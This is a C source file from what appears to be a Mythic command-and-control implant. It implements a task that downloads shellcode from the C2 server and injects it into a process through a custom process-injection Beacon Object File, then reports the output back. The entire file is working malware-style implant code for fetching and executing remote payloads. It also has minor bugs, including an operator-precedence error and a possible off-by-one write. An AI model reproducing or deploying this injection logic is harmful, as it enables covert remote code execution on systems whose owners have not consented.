#include "Tasks/InjectShellcode.h"

#include "Package.h"
#include "Parser.h"
#include "Task.h"
#include "Config.h"
#include "Mythic.h"
#include "Inject.h"
#include "BeaconCompatibility.h"
#include "Tasks/InlineExecute.h"

/**
 * @brief Inject shellcode into process and return output
 * 
 * @param[in] taskUuid Task's UUID
 * @param[inout] arguments PARSER struct containing task data.
 * @return VOID
 */
VOID InjectShellcode(PCHAR taskUuid, PPARSER arguments)
{
    /*
    TODO:
        - Parse isProcessInjectKit
        - Parse Bytes for proc inject BOF
        - Get shellcode file
        - Call COFF with sc as param
    */
    
    DWORD  Status;
    BOOL   isProcessInjectKit   = FALSE;
    MYTHIC_FILE Shellcode       = { 0 };
    PCHAR  injectKitBof         = NULL;
    SIZE_T uuidLen              = 0;
    SIZE_T kitLen               = 0;

    /* Parse BOF arguments */
    UINT32 nbArg = ParserGetInt32(arguments);
    _dbg("GOT %d arguments", nbArg);

    if (nbArg > 1) {
        isProcessInjectKit = TRUE;
    }

    PCHAR  fileUuid  = ParserGetString(arguments, &uuidLen);
    if (isProcessInjectKit) {
        injectKitBof = ParserGetString(arguments, &kitLen);
        injectKitBof += 8;                                                  // bc of the way translation container is packing it
        kitLen       -= 8;
        _dbg("[+] Using Custom Process Injection Kit. %d bytes", kitLen);
    }

    strncpy(Shellcode.fileUuid, fileUuid, TASK_UUID_SIZE + 1);
    Shellcode.fileUuid[TASK_UUID_SIZE + 1] = '\0';

    _dbg("Fetching Mythic file - %s", Shellcode.fileUuid);

    /* Fetch file from Mythic using File UUID */
    if (Status = MythicGetFileBytes(taskUuid, &Shellcode) != 0)
    {
        _err("Failed to fetch file from Mythic server.");
        PackageError(taskUuid, Status);
        return;
    }

    /*
        TODO

        - Add PROCESS_INJECT_SPAWN hook here
    */

    /* Process Injection Kit: Execute custom BOF */
    DWORD  filesize    = kitLen;
    BOOL   ignoreToken = FALSE;
    // Pack BOF args
    PPackage temp = PackageInit(NULL, FALSE);
    PackageAddShort(temp, (USHORT)ignoreToken);                        // +2 bytes
    PackageAddInt32_LE(temp, Shellcode.size);                          //  +4 bytes little-endian
    PackageAddBytes(temp, Shellcode.buffer, Shellcode.size, FALSE);    //  +sizeof(shellcode) bytes

    /* Pack temp into new length-prefixed Package */
    PPackage bofArgs = PackageInit(NULL, FALSE);
    PackageAddBytes(bofArgs, temp->buffer, temp->length, TRUE);  

    // Remove temp
    PackageDestroy(temp);

    /* Execute the Custom Process Injection Kit BOF */
    if (!RunCOFF(injectKitBof, &filesize, "gox64", bofArgs->buffer, bofArgs->length)) {
		_err("Failed to execute BOF in current thread.");
        LocalFree(bofArgs->buffer);
        PackageError(taskUuid, ERROR_MYTHIC_BOF);
        return;
	}

    /* Read BOF output from Global */
    PCHAR outdata = NULL;
	int outdataSize = 0;
    outdata = BeaconGetOutputData(&outdataSize);
	if (outdata == NULL) {
        _err("Failed get BOF output");
        LocalFree(bofArgs->buffer);
        PackageError(taskUuid, ERROR_MYTHIC_BOF);
        return;
	}

    PPackage data = PackageInit(0, FALSE);
    PackageAddString(data, outdata, FALSE);

    // Success
    PackageComplete(taskUuid, data);

END:
    // Cleanup
    // if (Output) free(Output);
    free(outdata);
    PackageDestroy(bofArgs);
    PackageDestroy(data);
    LocalFree(Shellcode.buffer);          // allocated in MythicGetFileBytes()
    Shellcode.buffer = NULL;
    // if (data) PackageDestroy(data);
}